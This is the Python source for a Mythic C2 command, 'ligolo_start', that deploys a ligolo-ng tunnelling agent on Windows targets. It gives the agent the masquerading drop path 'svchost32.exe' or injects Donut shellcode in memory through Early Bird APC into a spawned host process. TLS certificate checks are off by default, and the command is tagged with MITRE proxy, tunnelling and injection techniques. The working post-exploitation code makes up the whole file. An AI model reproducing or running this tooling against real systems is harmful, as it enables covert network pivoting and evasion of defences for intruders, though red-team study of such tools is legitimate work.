import json as _json
import os
import base64 as _base64
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class LigoloStartArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="connect",
                cli_name="Connect",
                display_name="Proxy Address",
                type=ParameterType.String,
                description="host:port (TCP/TLS) or ws://host:port",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=0)],
            ),
            CommandParameter(
                name="remote_path",
                cli_name="RemotePath",
                display_name="Drop Path",
                type=ParameterType.String,
                default_value=r"C:\Windows\Temp\svchost32.exe",
                description="Disk path when not using fork+run mode.",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=1)],
            ),
            CommandParameter(
                name="ignore_cert",
                cli_name="IgnoreCert",
                display_name="Ignore TLS Cert",
                type=ParameterType.Boolean,
                default_value=True,
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=2)],
            ),
            CommandParameter(
                name="retry",
                cli_name="Retry",
                display_name="Auto-Retry",
                type=ParameterType.Boolean,
                default_value=True,
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=3)],
            ),
            CommandParameter(
                name="bind",
                cli_name="Bind",
                display_name="Bind Address",
                type=ParameterType.String,
                description="Bind to ip:port instead of connecting out.",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=4)],
            ),
            CommandParameter(
                name="accept_fingerprint",
                cli_name="AcceptFingerprint",
                display_name="Accept Fingerprint",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=5)],
            ),
            CommandParameter(
                name="proxy",
                cli_name="Proxy",
                display_name="Proxy URL",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=6)],
            ),
            CommandParameter(
                name="user_agent",
                cli_name="UserAgent",
                display_name="User-Agent",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=7)],
            ),
            CommandParameter(
                name="verbose",
                cli_name="Verbose",
                display_name="Verbose",
                type=ParameterType.Boolean,
                default_value=False,
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=8)],
            ),
            CommandParameter(
                name="fork_run",
                cli_name="ForkRun",
                display_name="Fork+Run (in-memory)",
                type=ParameterType.Boolean,
                default_value=True,
                description=(
                    "Inject ligolo-ng in-memory via Early Bird APC (no disk write). "
                    "Uses the process set by spawnto as host. "
                    "Requires bundled binaries/agent.exe in the container."
                ),
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=9)],
            ),
        ]

    async def parse_arguments(self):
        if not self.command_line:
            return
        cmd = self.command_line.strip()
        if cmd.startswith("{"):
            self.load_args_from_json_string(cmd)
        else:
            self.load_args_from_json_string(_json.dumps({"connect": cmd}))


class LigoloStartCommand(CommandBase):
    cmd = "ligolo_start"
    needs_admin = False
    help_cmd = "ligolo_start 10.0.0.1:11601"
    description = (
        "Start a ligolo-ng agent session.\n"
        "Disk-drop mode: Start proxy first: ./proxy -selfcert -laddr 0.0.0.0:11601\n"
        "Fork+Run mode: connection args baked into Donut shellcode at task time, injected via Early Bird APC."
    )
    version = 1
    author = "@goultarde"
    argument_class = LigoloStartArguments
    attackmapping = ["T1090", "T1572", "T1071.001", "T1055.004"]
    attributes = CommandAttributes(supported_os=[SupportedOS.Windows])

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        connect      = taskData.args.get_arg("connect") or ""
        bind_addr    = taskData.args.get_arg("bind") or ""
        remote_path  = taskData.args.get_arg("remote_path") or r"C:\Windows\Temp\svchost32.exe"
        fork_run     = taskData.args.get_arg("fork_run") or False

        if not connect and not bind_addr:
            raise Exception("connect or bind is required")

        target = bind_addr if bind_addr else connect

        if fork_run:
            # Read shellcode bytes cached by builder.py (base64), upload to Mythic at task time.
            payload_search = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
                CallbackID=taskData.Callback.ID
            ))
            if not payload_search.Success or not payload_search.Payloads:
                raise Exception("Could not find payload for this callback")
            payload_uuid = payload_search.Payloads[0].UUID

            cache_path = "/tmp/ligolo_sc_cache.json"
            sc_b64 = None
            try:
                with open(cache_path) as cf:
                    cache = _json.load(cf)
                sc_b64 = cache.get(payload_uuid)
            except Exception:
                pass

            if not sc_b64:
                raise Exception(
                    "Ligolo fork+run shellcode not found for this payload. "
                    "Rebuild with ligolo_start selected and binaries/agent.exe present. "
                    "Check builder logs for 'fork+run shellcode ready'."
                )

            sc_bytes = _base64.b64decode(sc_b64)
            sc_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
                TaskID=taskData.Task.ID,
                FileContents=sc_bytes,
                DeleteAfterFetch=True,
            ))
            if not sc_resp.Success:
                raise Exception(f"Failed to register ligolo shellcode: {sc_resp.Error}")
            file_id = sc_resp.AgentFileId

            # Build ligolo args string injected via CreateProcessW lpCommandLine.
            # The process sees GetCommandLineW() return "{host_process} {args}",
            # ligolo-ng parses argv[1:] and gets the connection parameters.
            args_parts = []
            if connect:    args_parts.append(f"-connect {connect}")
            if bind_addr:  args_parts.append(f"-bind {bind_addr}")
            if taskData.args.get_arg("ignore_cert"):  args_parts.append("-ignore-cert")
            if taskData.args.get_arg("retry"):        args_parts.append("-retry")
            if taskData.args.get_arg("verbose"):      args_parts.append("-v")
            accept_fp      = taskData.args.get_arg("accept_fingerprint") or ""
            proxy_url      = taskData.args.get_arg("proxy") or ""
            user_agent_val = taskData.args.get_arg("user_agent") or ""
            if accept_fp:       args_parts.append(f"-accept-fingerprint {accept_fp}")
            if proxy_url:       args_parts.append(f"-proxy {proxy_url}")
            if user_agent_val:  args_parts.append(f'-ua "{user_agent_val}"')

            taskData.args.add_arg("shellcode_file_id", file_id, ParameterType.String)
            taskData.args.add_arg("ligolo_args", " ".join(args_parts), ParameterType.String)
            response.DisplayParams = f"fork+run (spawnto) | {target}"
        else:
            response.DisplayParams = f"{target} -> {remote_path}"

        return response

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
